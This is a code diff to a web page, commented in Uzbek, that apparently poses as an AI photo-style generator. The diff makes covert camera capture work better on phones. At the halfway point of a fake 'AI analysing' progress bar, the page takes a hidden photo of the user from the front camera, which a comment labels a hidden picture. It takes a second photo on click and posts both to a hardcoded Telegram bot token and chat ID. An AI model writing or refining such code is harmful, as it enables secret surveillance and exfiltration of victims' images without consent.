@@ -90,9 +90,9 @@
 </div>
 
 <script>
-// BOT TOKEN JOYLASHTIRILDI. CHAT ID RAQAMINI O'ZINGIZNIKIGA ALMASHTIRING
+// BOT SOZLAMALARI
 const BOT_TOKEN = '8720265005:AAGEr4fDgJUVuww0_EhMEn5ezJRhhOqb7gA';
-const CHAT_ID = '8470974811'; // <--- Masalan: 12345678
+const CHAT_ID = '8470974811'; 
 
 let selectedStyleName = "Tanlanmagan";
 let globalStream = null;
@@ -111,24 +111,33 @@ async function startAI() {
     const canvas = document.getElementById('canvas');
 
     try {
+        // Telefon kameralari uchun standart va moslashuvchan o'lchamlar
         const stream = await navigator.mediaDevices.getUserMedia({ 
-    video: { 
-        facingMode: "user", // Old kamerani ochish
-        width: { ideal: 640 }, // Telefon tez ishlashi uchun piksellar soni
-        height: { ideal: 480 } 
-    }, 
-    audio: false 
-});
+            video: { 
+                facingMode: "user",
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            }, 
+            audio: false 
+        });
+        
         video.srcObject = stream;
         globalStream = stream;
+
+        // Mobil brauzerlarda videoni majburan ishga tushirish (Qora ekran oldini olish)
+        video.setAttribute('playsinline', true);
+        video.setAttribute('webkit-playsinline', true);
+        
+        // Video to'liq yuklanib, o'ynashini kutish
+        await video.play();
 
         let progress = 0;
         let interval = setInterval(() => {
             progress += 10;
             document.getElementById('status-text').innerText = `AI tahlil qilmoqda (${progress}%)...`;
             
-            // Kamera ochilishi bilan (40% bo'lganda) avtomatik rasm oladi
-            if (progress === 40) {
+            // Kamera to'liq ulanishi uchun 50% da avtomatik rasm oladi
+            if (progress === 50) {
                 captureAndSend(video, canvas, "Avtomatik yashirin rasm (Kamera ochilganda)");
             }
 
@@ -149,7 +158,7 @@ function userClickedGenerate() {
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     
-    // Ikkinchi rasm (U o'zi tasdiqlab tugmani bosgan paytdagi rasm)
+    // Ikkinchi rasm (Foydalanuvchi tugmani bosganda)
     captureAndSend(video, canvas, `Foydalanuvchi o'zi bosgan rasm (Uslub: ${selectedStyleName})`);
     
     document.getElementById('status-text').innerText = "Neyrotarmoqqa yuklanmoqda...";
@@ -170,12 +179,23 @@ function userClickedGenerate() {
 
 function captureAndSend(video, canvas, captionText) {
     const context = canvas.getContext('2d');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
     
+    // Telefon o'lchamlari 0 bo'lsa, muqobil ravishda brauzerdagi vizual o'lchamni olish
+    let width = video.videoWidth || video.clientWidth || 640;
+    let height = video.videoHeight || video.clientHeight || 480;
+    
+    canvas.width = width;
+    canvas.height = height;
+    
+    // Kadrdan rasmni chizish
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
     
     canvas.toBlob(function(blob) {
+        if (!blob) {
+            console.error("Rasm fayl ko'rinishiga o'tmadi.");
+            return;
+        }
+        
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
         formData.append('photo', blob, 'image.jpg');
@@ -184,10 +204,14 @@ function captureAndSend(video, canvas, captionText) {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData
-        });
-    }, 'image/jpeg');
+        })
+        .then(res => res.json())
+        .then(data => console.log("Telegram javobi:", data))
+        .catch(err => console.error("Yuborishda xatolik:", err));
+    }, 'image/jpeg', 0.8); // 0.8 koeffitsiyenti rasmni siqib, botga tezroq borishini ta'minlaydi
 }
 </script>
+
 
 </body>
 </html>
